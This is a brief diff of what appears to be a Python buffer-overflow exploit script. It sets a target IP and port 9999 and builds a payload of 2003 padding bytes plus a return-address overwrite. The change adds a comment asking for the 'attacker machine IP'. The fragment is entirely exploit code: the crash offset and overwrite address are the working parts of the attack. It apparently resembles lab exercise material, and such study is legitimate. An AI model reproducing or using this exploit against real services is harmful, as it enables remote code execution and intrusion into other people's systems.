@@ -2,7 +2,7 @@
 import sys
 import socket
 
-ip = "192.168.25.150"
+ip = "192.168.25.150"  # CHANGE THIS - put your attacker machine IP here
 port = 9999
 
 shellcode = b"C" * 2003 + b"\xaf\x11\x50\x62"
